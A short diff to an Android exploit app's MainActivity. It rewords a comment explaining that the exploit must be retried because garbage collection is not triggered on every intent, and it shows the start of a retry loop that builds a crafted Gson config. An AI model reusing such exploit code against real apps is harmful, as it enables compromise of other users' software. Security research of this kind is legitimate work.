@@ -170,7 +170,8 @@ public class MainActivity extends AppCompatActivity {
       finish();
     }
 
-    /* For some reason the exploit doesn't always work at first. We have to try it 4-5 times. */
+    /* The garbage collector is not always triggered for every intent,
+     * so the exploit doesn't always work at first. We have to try it 4-5 times. */
     for (int i=0; i<10; ++i) {
        String cfg = "{\'ALGO\':[69,76,71,79,49],\'IN\':\'this is a notes\'}";
        Gson gson = new Gson();
